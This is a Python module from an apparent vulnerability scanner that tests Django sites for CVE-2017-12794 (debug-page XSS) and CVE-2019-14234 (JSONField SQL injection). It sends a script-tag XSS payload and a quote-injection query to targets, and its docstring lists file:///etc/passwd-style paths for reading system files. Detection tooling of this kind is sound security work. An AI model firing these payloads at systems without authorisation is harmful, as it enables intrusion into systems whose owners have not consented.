#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Django扫描类: 
        Django debug page XSS漏洞
            CVE-2017-12794
        Django JSONfield sql注入漏洞
            CVE-2019-14234
file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests

class Django():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Django'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2017_12794_payloads = [
            {
                'path': 'create_user/?username=<ScRiPt>prompt(\'12794\')</sCrIpt>',
                'data': ''
            }
        ]

        self.cve_2019_14234_payloads = [
            {
                'path': 'admin/vuln/collection/?detail__a%27b=123',
                'data': ''
            },
            {
                'path': 'vuln/collection/?detail__a%27b=123',
                'data': ''
            }
        ]

    def cve_2017_12794_scan(self, url):
        '''Django debug page XSS漏洞
                构造url创建新用户, 同时拼接xss语句, 得到已创建的提示;
                此时再次访问该链接(即创建同一个xss用户), 将触发恶意代码
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'XSS'
        vul_info['vul_id'] = 'CVE-2017-12794'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cve_2017_12794_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
                # * 该XSS漏洞较奇怪, 需要请求2次, 2次的payload必须一模一样
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None

            if ("prompt('12794')" in res.text):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def cve_2019_14234_scan(self, url):
        ''' Django JSONfield sql注入漏洞
                需要登录, 并进入当前用户的目录下
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'SQLinject'
        vul_info['vul_id'] = 'CVE-2019-14234'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cve_2019_14234_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None

            if (('ProgrammingError' in res.text) or ('Request information' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def addscan(self, url):
        return [
            thread(target=self.cve_2017_12794_scan, url=url),
            thread(target=self.cve_2019_14234_scan, url=url)
        ]

django = Django()